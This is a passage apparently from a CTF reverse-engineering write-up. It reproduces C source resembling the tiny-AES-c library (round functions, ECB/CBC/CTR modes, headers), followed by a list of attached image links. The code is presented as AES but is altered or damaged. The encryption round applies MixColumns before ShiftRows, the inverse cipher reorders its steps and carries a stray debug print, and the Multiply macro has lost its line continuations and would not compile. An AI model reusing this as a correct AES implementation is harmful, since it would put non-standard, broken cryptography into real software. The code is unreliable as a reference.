  (*state)[2][1] = (*state)[3][1];
  (*state)[3][1] = temp;

  // Rotate second row 2 columns to left  
  temp           = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp           = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to left
  temp           = (*state)[0][3];
  (*state)[0][3] = (*state)[3][3];
  (*state)[3][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[1][3];
  (*state)[1][3] = temp;
}

static uint8_t xtime(uint8_t x)
{
  return ((x<<1) ^ (((x>>7) & 1) * 0x1b));
}

// MixColumns function mixes the columns of the state matrix
static void MixColumns(state_t* state)
{
  uint8_t i;
  uint8_t Tmp, Tm, t;
  for (i = 0; i < 4; ++i)
  {  
    t   = (*state)[i][0];
    Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3] ;
    Tm  = (*state)[i][0] ^ (*state)[i][1] ; Tm = xtime(Tm);  (*state)[i][0] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][1] ^ (*state)[i][2] ; Tm = xtime(Tm);  (*state)[i][1] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][2] ^ (*state)[i][3] ; Tm = xtime(Tm);  (*state)[i][2] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][3] ^ t ;              Tm = xtime(Tm);  (*state)[i][3] ^= Tm ^ Tmp ;
  }
}

// Multiply is used to multiply numbers in the field GF(2^8)
// Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary
//       The compiler seems to be able to vectorize the operation better this way.
//       See https://github.com/kokke/tiny-AES-c/pull/34
#if MULTIPLY_AS_A_FUNCTION
static uint8_t Multiply(uint8_t x, uint8_t y)
{
  return (((y & 1) * x) ^
       ((y>>1 & 1) * xtime(x)) ^
       ((y>>2 & 1) * xtime(xtime(x))) ^
       ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^
       ((y>>4 & 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */
  }
#else
#define Multiply(x, y)                                
      (  ((y & 1) * x) ^                              
      ((y>>1 & 1) * xtime(x)) ^                       
      ((y>>2 & 1) * xtime(xtime(x))) ^                
      ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^         
      ((y>>4 & 1) * xtime(xtime(xtime(xtime(x))))))   

#endif

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
/*
static uint8_t getSBoxInvert(uint8_t num)
{
  return rsbox[num];
}
*/
#define getSBoxInvert(num) (rsbox[(num)])

// MixColumns function mixes the columns of the state matrix.
// The method used to multiply may be difficult to understand for the inexperienced.
// Please use the references to gain more information.
static void InvMixColumns(state_t* state)
{
  int i;
  uint8_t a, b, c, d;
  for (i = 0; i < 4; ++i)
  { 
    a = (*state)[i][0];
    b = (*state)[i][1];
    c = (*state)[i][2];
    d = (*state)[i][3];

    (*state)[i][0] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09);
    (*state)[i][1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d);
    (*state)[i][2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b);
    (*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e);
  }
}

// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void InvSubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[j][i] = getSBoxInvert((*state)[j][i]);
    }
  }
}

static void InvShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to right  
  temp = (*state)[3][1];
  (*state)[3][1] = (*state)[2][1];
  (*state)[2][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[0][1];
  (*state)[0][1] = temp;

  // Rotate second row 2 columns to right 
  temp = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to right
  temp = (*state)[0][3];
  (*state)[0][3] = (*state)[1][3];
  (*state)[1][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[3][3];
  (*state)[3][3] = temp;
}
#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)

// Cipher is the main function that encrypts the PlainText.
static void Cipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(0, state, RoundKey);

  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr rounds are executed in the loop below.
  // Last one without MixColumns()
  for (round = 1; round < 10 ; ++round)
  {
    SubBytes(state);
    MixColumns(state);
    ShiftRows(state);
    AddRoundKey(round, state, RoundKey);
  }
  // Add round key to last round
  SubBytes(state);
  ShiftRows(state);

  AddRoundKey(Nr, state, RoundKey);
}

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
static void InvCipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(Nr, state, RoundKey);

  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr rounds are executed in the loop below.
  // Last one without InvMixColumn()
  InvShiftRows(state);
  InvSubBytes(state);

  for (round = (Nr - 1);round > 0; --round)
  {
      printf("%dn", round);

    AddRoundKey(round, state, RoundKey);

    InvShiftRows(state);
    InvMixColumns(state);
    InvSubBytes(state);

  }
  AddRoundKey(0, state, RoundKey);

}
#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)

/*****************************************************************************/
/* Public functions:                                                         */
/*****************************************************************************/
#if defined(ECB) && (ECB == 1)

void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call encrypts the PlainText with the Key using AES algorithm.
  Cipher((state_t*)buf, ctx->RoundKey);
}

void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)
{
  // The next function call decrypts the PlainText with the Key using AES algorithm.
  InvCipher((state_t*)buf, ctx->RoundKey);
}

#endif // #if defined(ECB) && (ECB == 1)

#if defined(CBC) && (CBC == 1)

static void XorWithIv(uint8_t* buf, const uint8_t* Iv)
{
  uint8_t i;
  for (i = 0; i < AES_BLOCKLEN; ++i) // The block in AES is always 128bit no matter the key size
  {
    buf[i] ^= Iv[i];
  }
}

void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)
{
  size_t i;
  uint8_t *Iv = ctx->Iv;
  for (i = 0; i < length; i += AES_BLOCKLEN)
  {
    XorWithIv(buf, Iv);
    Cipher((state_t*)buf, ctx->RoundKey);
    Iv = buf;
    buf += AES_BLOCKLEN;
  }
  /* store Iv in ctx for next call */
  memcpy(ctx->Iv, Iv, AES_BLOCKLEN);
}

void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
{
  size_t i;
  uint8_t storeNextIv[AES_BLOCKLEN];
  for (i = 0; i < length; i += AES_BLOCKLEN)
  {
    memcpy(storeNextIv, buf, AES_BLOCKLEN);
    InvCipher((state_t*)buf, ctx->RoundKey);
    XorWithIv(buf, ctx->Iv);
    memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN);
    buf += AES_BLOCKLEN;
  }

}

#endif // #if defined(CBC) && (CBC == 1)

#if defined(CTR) && (CTR == 1)

/* Symmetrical operation: same function for encrypting as for decrypting. Note any IV/nonce should never be reused with the same key */
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)
{
  uint8_t buffer[AES_BLOCKLEN];
  
  size_t i;
  int bi;
  for (i = 0, bi = AES_BLOCKLEN; i < length; ++i, ++bi)
  {
    if (bi == AES_BLOCKLEN) /* we need to regen xor compliment in buffer */
    {
      
      memcpy(buffer, ctx->Iv, AES_BLOCKLEN);
      Cipher((state_t*)buffer,ctx->RoundKey);

      /* Increment Iv and handle overflow */
      for (bi = (AES_BLOCKLEN - 1); bi >= 0; --bi)
      {
 /* inc will overflow */
        if (ctx->Iv[bi] == 255)
 {
          ctx->Iv[bi] = 0;
          continue;
        } 
        ctx->Iv[bi] += 1;
        break;   
      }
      bi = 0;
    }

    buf[i] = (buf[i] ^ buffer[bi]);
  }
}

#endif // #if defined(CTR) && (CTR == 1)
```



```
#ifndef _AES_H_
#define _AES_H_

#include <stdint.h>
#include <stddef.h>

// #define the macros below to 1/0 to enable/disable the mode of operation.
//
// CBC enables AES encryption in CBC-mode of operation.
// CTR enables encryption in counter-mode.
// ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.

// The #ifndef-guard allows it to be configured before #include'ing or at compile time.
#ifndef CBC
  #define CBC 1
#endif

#ifndef ECB
  #define ECB 1
#endif

#ifndef CTR
  #define CTR 1
#endif

#define AES128 1
//#define AES192 1
//#define AES256 1

#define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only

#if defined(AES256) && (AES256 == 1)
    #define AES_KEYLEN 32
    #define AES_keyExpSize 240
#elif defined(AES192) && (AES192 == 1)
    #define AES_KEYLEN 24
    #define AES_keyExpSize 208
#else
    #define AES_KEYLEN 16   // Key length in bytes
    #define AES_keyExpSize 176
#endif

struct AES_ctx
{
  uint8_t RoundKey[AES_keyExpSize];
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
  uint8_t Iv[AES_BLOCKLEN];
#endif
};

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
#endif

#if defined(ECB) && (ECB == 1)
// buffer size is exactly AES_BLOCKLEN bytes; 
// you need only AES_init_ctx as IV is not used in ECB 
// NB: ECB is considered insecure for most uses
void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);

#endif // #if defined(ECB) && (ECB == !)

#if defined(CBC) && (CBC == 1)
// buffer size MUST be mutile of AES_BLOCKLEN;
// Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);

#endif // #if defined(CBC) && (CBC == 1)

#if defined(CTR) && (CTR == 1)

// Same function for encrypting as for decrypting. 
// IV is incremented for every block, and used after encryption as XOR-compliment for output
// Suggesting https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx with AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);

#endif // #if defined(CTR) && (CTR == 1)

#endif // _AES_H_
```



```
#ifndef _AES_HPP_
#define _AES_HPP_

#ifndef __cplusplus
#error Do not include the hpp header in a c project!
#endif //__cplusplus

extern "C" {
#include "aes.h"
}

#endif //_AES_HPP_
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/5-1730600840.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/6-1730600841.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1730600841.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1730600842.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/2-1730600842.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1730600842.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/2-1730600842.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1730600843.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1730600843.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/7-1730600843.png)